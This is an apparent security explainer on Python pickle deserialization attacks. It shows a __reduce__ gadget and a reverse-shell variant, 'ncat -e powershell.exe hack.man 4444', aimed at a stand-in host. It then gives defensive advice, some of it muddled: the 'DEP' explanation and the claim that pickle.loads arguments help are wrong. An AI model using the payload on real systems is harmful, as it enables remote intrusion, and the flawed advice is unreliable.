# Malicious Pickle

A dangerous misuse of Python's pickle module—specifically demonstrating how arbitrary code execution can be embedded inside serialized Python objects.

What GNAT is, what it does, and why this is important (or dangerous).

## 🔍 What is GNAT in This Code?
```
class GNAT:
    def __reduce__(self):
        return (os.system, ('id',))
```        
GNAT is a custom class with a special method __reduce__() defined.
__reduce__() is part of Python’s pickling protocol. It's used to tell pickle how to serialize and deserialize an object. Here, it returns a tuple: (os.system, ('id',)). This tells pickle that when unpickling, it should run os.system("id").


💣 What This Code Does
It defines a malicious class (GNAT) that triggers a shell command when deserialized.
It serializes it using pickle.dumps() and base64-encodes the result.
Upon deserialization (which is not shown here, but implied), the command id will be executed via os.system.

☠️ Potential Exploitation
Replace:
```
return (os.system, ('id',))
```

with:
```
return (os.system, ('ncat -e powershell.exe hack.man 4444',))
```

And the object will, when deserialized, open a reverse shell to hack.man on port 4444. This is a serious remote code execution (RCE) vulnerability.

🔒 Why This Is Important
➤ pickle is not safe for untrusted input
If you load a pickle file (pickle.load(...)) from an untrusted source, it may execute arbitrary code.

This is a classic deserialization attack—just like Java's ObjectInputStream or PHP's unserialize.

➤ Used in:
Security testing (Red Teaming / Exploits)
Malware payloads
Serialization-based attacks

## 🧪 The Safe Way to Serialize
If you need safe serialization, use:
- json for primitive types
- yaml.safe_load (not yaml.load)
- protobuf or MessagePack for structured data

🧾 Summary
- GNAT here is a custom class that uses Python's __reduce__() to demonstrate code execution via pickling.
- The code is a clear example of how malicious payloads can be crafted using Python's pickle module.
- Never unpickle data from untrusted sources.
- You ** cannot safely unpickle untrusted data — ever ** — even with yaml.**safe_load**. pickle is inherently unsafe for untrusted input because it allows arbitrary code execution. Think of pickle as a trusted-only binary serialization format, not a secure transport or storage mechanism.

## ✅ What You Should Do Instead
1. Use YAML, JSON, or MessagePack for Safe Data Exchange (signed as trusted)
If you're receiving data from untrusted sources:
- Use yaml.safe_load or json.loads
- Only parse known-safe formats

2. Replace Pickle With Safer Alternatives
Use:
- json — for basic types (dict, list, str, int, etc.)
- PyYAML (yaml.safe_load) — for structured config-like data
- msgpack — for compact binary-safe JSON
- protobuf / cap’n proto / flatbuffers — for high-performance structured binary formats

3. Use a custom deserializer
If you absolutely need to deserialize Python objects:
- Write a whitelist of allowed classes/types
- Use something like [pickle.loads(data, fix_imports=False, encoding="bytes")] carefully
- Or better, design your own safe serialization format

** Reason: The DEP (Data Execution Prevention) problem. You cannot execute yaml and json, but you can execute pickle.loads() as it is basically a system call. **
